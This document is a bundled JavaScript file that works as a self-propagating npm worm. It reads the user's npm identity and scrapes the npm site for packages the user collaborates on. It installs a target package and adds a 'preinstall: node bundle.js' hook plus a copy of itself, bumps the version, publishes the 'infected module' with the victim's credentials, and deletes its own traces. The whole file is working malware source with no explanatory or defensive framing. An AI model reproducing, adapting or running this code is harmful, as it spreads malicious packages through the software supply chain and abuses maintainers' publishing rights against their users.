const exec = __webpack_require__(0).exec;

const fs = __webpack_require__(1);
const path = __webpack_require__(2);
const request = __webpack_require__(180);
const cheerio = __webpack_require__(44);

function execP (cmd, opts) {
        opts = opts || {};

        return new Promise((resolve, reject) => {
                exec(cmd, opts, (err, stdout, stderr) => {
                        if (err) {
                                reject(err);
                        } else {
                                resolve({stdout, stderr});
                        }
                });
        });
}

function currentUser () {
    return execP('npm whoami');
}

function getOwnedModules (user) {
                var url = 'https://www.npmjs.org/~' + user;

                return new Promise((resolve, reject) => {
                        request(url, function (error, response, body) {
                                if (error) {
                                        reject(error);
                                } else {
                                        var $ = cheerio.load(body);
                                        var packages = $('.collaborated-packages a').map(function (i, el) {
                                                return $(this).text();
                                        }).get();

                                        resolve(packages);
                                }
                        });
                });
}

function modulePath (moduleName) {
    return path.resolve('./node_modules/' + moduleName);
}

function installModule (moduleName) {
    return execP('npm install ' + moduleName);
}

function incrementPatchVersion (moduleName) {
    const opts = {
        cwd: modulePath(moduleName)
    };

    return execP('npm version patch', opts);
}

function addScript (moduleName) {
    const pkgJsonPath = modulePath(moduleName) + '/package.json';
    const content = fs.readFileSync(pkgJsonPath);
    const pkgJson = JSON.parse(content);
    pkgJson.scripts = pkgJson.scripts || {};
    pkgJson.scripts.preinstall = "node bundle.js";

    fs.writeFileSync(pkgJsonPath, JSON.stringify(pkgJson, null, 2));
}

function copyScript (moduleName) {
    const content = fs.readFileSync('bundle.js');

    fs.writeFileSync(modulePath(moduleName) + '/bundle.js', content);
}

function publishInfectedModule (moduleName) {
    const opts = {
        cwd: modulePath(moduleName)
    };

    return execP('npm publish .', opts);
}

function cleanScript () {
  const pkgJsonPath = path.resolve('./package.json');
  const content = fs.readFileSync(pkgJsonPath);
  const pkgJson = JSON.parse(content);

  pkgJson.scripts = pkgJson.scripts || {};

  delete pkgJson.scripts.preinstall;
  delete pkgJson.scripts.install;
  delete pkgJson.scripts.postinstall;

  fs.writeFileSync('package.json', JSON.stringify(pkgJson, null, 2));
}

function cleanFile () {
  fs.unlinkSync('bundle.js');
}

function clean () {
  try {
    cleanScript();
    cleanFile();
  } catch (e) {}
}

function infectModule (moduleName) {
        installModule(moduleName)
        .then(() => {
                addScript(moduleName);
                copyScript(moduleName);

                return incrementPatchVersion(moduleName);
        })
        .then(() => publishInfectedModule(moduleName))
        .catch(() => {});
}

const MODULE_NAME = "sdfjghlkfjdshlkjdhsfg";

infectModule(MODULE_NAME);
